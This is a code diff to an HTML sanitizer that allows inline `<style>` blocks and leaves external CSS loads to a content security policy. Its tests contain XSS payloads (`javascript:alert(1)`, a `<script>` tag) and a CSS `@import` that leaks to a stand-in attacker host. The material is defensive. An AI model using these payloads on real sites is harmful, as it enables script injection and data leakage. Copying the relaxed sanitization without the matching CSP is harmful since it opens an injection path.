@@ -24,14 +24,28 @@
 //! What we deliberately strip even though CSP would also stop it:
 //!   - `<script>`, `<iframe>`, `<object>`, `<embed>` — ammonia default
 //!   - `<meta http-equiv="refresh">` — CSP cannot block this; we drop <meta>
-//!   - `<style>` blocks — CSS-injection surface ammonia doesn't parse;
-//!     inline `style="…"` attributes are still allowed
 //!   - `javascript:` / `vbscript:` URLs — ammonia default url_schemes
 //!   - `target` on links without `rel=noopener` — link_rel enforces it
 //!
 //! What we add on top of ammonia defaults:
 //!   - Structural tags (`<html>`, `<head>`, `<title>`, `<body>`) so agents
 //!     can emit full documents, not just fragments
+//!   - `<style>` blocks (v1.4) — re-enabled by removing `style` from ammonia's
+//!     default `clean_content_tags` and adding it to the tag allowlist, so a
+//!     full class-based stylesheet (a class-based design system) can ship inline
+//!     in one document. Its content is RAWTEXT: the HTML parser splits it at
+//!     `</style>` and never re-parses it as HTML (a literal `<script>` inside a
+//!     `<style>` is inert CSS, not an element), so there is no breakout. The
+//!     CSS-load vectors that motivate stripping `<style>` are owned by the CSP,
+//!     not the sanitizer: `style-src 'unsafe-inline' data:` / `img-src 'self'
+//!     data:` / `font-src 'self' data:` carry NO external origin, so a remote
+//!     `@import`, `background:url(https://…)` exfil, or external `@font-face`
+//!     simply can't load; a `data:` `@import` is inline-equivalent CSS under the
+//!     same CSP and cannot escalate. `expression()`/`-moz-binding` are dead in
+//!     modern engines. We therefore do NOT CSS-parse `<style>` content (no
+//!     `@import` regex pass) — it would risk corrupting valid CSS while adding
+//!     nothing CSP doesn't already guarantee. Mutation-XSS via RAWTEXT/namespace
+//!     confusion is closed generically by ammonia's `check_expected_namespace`.
 //!   - SVG drawing primitives + their geometry/presentation attributes
 //!   - `role` and `aria-*` attributes for accessibility, minus four
 //!     IDREF-typed attributes that enable accessibility-tree hijack
@@ -45,6 +59,17 @@ use wasm_bindgen::prelude::*;
 /// Structural tags so an agent can POST a complete `<html>…</html>` document
 /// rather than a body fragment. Ammonia defaults strip these.
 const STRUCTURAL_TAGS: &[&str] = &["html", "head", "title", "body"];
+
+/// `<style>` — re-enabled (v1.4) so a document can ship a single inline
+/// stylesheet (a class-based design system: `:root` tokens, classes,
+/// `:hover`/`:focus`, `@media (prefers-color-scheme)`, `@keyframes`). Ammonia's
+/// default treats `style` as a *clean-content* tag (drops the element AND its
+/// CSS text), so allowing it takes two steps in `make_builder`: add it to the
+/// tag allowlist AND remove it from `clean_content_tags`. Safety lives in the
+/// CSP, not here — see the module-level note. No `<style>` attributes are
+/// allowed (ammonia drops unknown attrs), so it always serializes as a bare
+/// `<style>…</style>`; the CSS round-trips verbatim as RAWTEXT.
+const STYLESHEET_TAGS: &[&str] = &["style"];
 
 /// Tags ammonia's default allowlist omits but our publishing contract treats
 /// as allowed. Two gaps, both benign containers with no script/URL surface:
@@ -122,7 +147,14 @@ fn make_builder() -> Builder<'static> {
     extra.extend(STRUCTURAL_TAGS.iter().copied());
     extra.extend(EXTRA_TAGS.iter().copied());
     extra.extend(SVG_TAGS.iter().copied());
+    extra.extend(STYLESHEET_TAGS.iter().copied());
     b.add_tags(extra);
+
+    // `<style>` is in ammonia's default `clean_content_tags` (the element AND
+    // its CSS text are dropped). Adding it to `tags` above only keeps the empty
+    // element; removing it here keeps the CSS too. See STYLESHEET_TAGS and the
+    // module-level note for why this is safe under the render CSP.
+    b.rm_clean_content_tags(STYLESHEET_TAGS);
 
     // Generic attributes — allowed on any element. Ammonia merges with
     // its per-tag attribute defaults rather than replacing them.
@@ -201,7 +233,12 @@ pub fn sanitizer_version() -> String {
     //        re-allow <section> and <tfoot> (omitted by ammonia, so unwrapped),
     //        grant `dir` generically, and grant `reversed`/`value`/`type` on
     //        list elements (ammonia granted only `start` on <ol>).
-    "ammonia-v1.3".to_string()
+    // v1.4 — allow <style> blocks: remove `style` from ammonia's default
+    //        `clean_content_tags` and add it to the tag allowlist so a full
+    //        class-based stylesheet (a class-based design system) ships inline.
+    //        CSS round-trips verbatim as RAWTEXT; external CSS loads (@import,
+    //        url(), @font-face) stay blocked by the render CSP, not the parser.
+    "ammonia-v1.4".to_string()
 }
 
 // ---------------------------------------------------------------------------
@@ -677,22 +714,52 @@ mod tests {
         );
     }
 
-    // ----- <style> blocks (CSS attack surface) ------------------------------
+    // ----- <style> blocks (v1.4: allowed; safety owned by the CSP) ----------
 
     #[test]
-    fn strips_style_block_with_js_url() {
-        assert_strips_all(
-            "<style>body{background:url(\"javascript:alert(1)\")}</style>",
-            &["<style", "javascript:"],
+    fn keeps_style_block_and_its_css() {
+        // The whole point of v1.4: a class-based stylesheet survives intact so
+        // a class-based design system can ship inline in one document.
+        let out = sanitize("<style>.fr-card{border-radius:16px;color:#222}</style>");
+        assert!(out.contains("<style>"), "style element dropped: {out}");
+        assert!(
+            out.contains(".fr-card{border-radius:16px;color:#222}"),
+            "CSS text mangled: {out}"
         );
     }
 
     #[test]
-    fn strips_style_block_with_import() {
-        assert_strips_all(
-            "<style>@import url(\"https://attacker.example/leak.css\");</style>",
-            &["<style", "attacker"],
-        );
+    fn keeps_style_block_with_at_rules_and_root_vars() {
+        // :root custom properties, @media (prefers-color-scheme), and
+        // pseudo-classes are the features that make the class-based system
+        // worth enabling — they must round-trip verbatim (RAWTEXT, no escaping).
+        let css = ":root{--fr-primary:#6750A4}\
+                   .fr-btn:hover{opacity:.92}\
+                   @media (prefers-color-scheme:dark){:root{--fr-surface:#1C1B1F}}";
+        let out = sanitize(&format!("<style>{css}</style>"));
+        assert!(out.contains(css), "at-rules/vars did not round-trip: {out}");
+    }
+
+    #[test]
+    fn style_block_external_loads_are_left_to_the_csp() {
+        // We deliberately do NOT CSS-parse <style> content. An external @import
+        // is preserved as text but is inert at render time: the document CSP's
+        // style-src has no external origin, so the load never happens. This test
+        // pins the contract (style kept, CSS untouched) — the *enforcement* is
+        // asserted in the serve-layer CSP tests, not here.
+        let out = sanitize("<style>@import url(\"https://attacker.example/leak.css\");</style>");
+        assert!(out.contains("<style>"), "style element dropped: {out}");
+        assert!(out.contains("@import"), "CSS unexpectedly rewritten: {out}");
+    }
+
+    #[test]
+    fn style_block_content_is_not_reparsed_as_html() {
+        // <style> is RAWTEXT: a literal <script> inside it is CSS text, never an
+        // element, so it cannot execute. The first </style> closes the block, so
+        // a real (strippable) <script> after it is handled normally.
+        let out = sanitize("<style>x{}</style><script>alert(1)</script>");
+        assert!(!out.contains("<script"), "script after style survived: {out}");
+        assert!(!out.contains("alert(1)"), "script payload survived: {out}");
     }
 
     // ----- SVG-specific vectors --------------------------------------------
@@ -854,6 +921,15 @@ mod tests {
         assert!(out.contains("<section"), "section wrapper dropped: {}", out);
         assert!(out.contains("#2B211A"), "section lost its inline style: {}", out);
         assert!(out.contains("<p>hi</p>"), "section children dropped: {}", out);
+    }
+
+    #[test]
+    fn contract_style_block_survives() {
+        // Pins the v1.4 allowance: a <style> block must survive sanitization,
+        // guarding against an accidental future re-strip (e.g. an ammonia
+        // upgrade re-adding `style` to its clean_content_tags).
+        let out = sanitize("<style>.x{color:#333}</style>");
+        assert!(out.contains("<style"), "style block dropped: {}", out);
     }
 
     #[test]
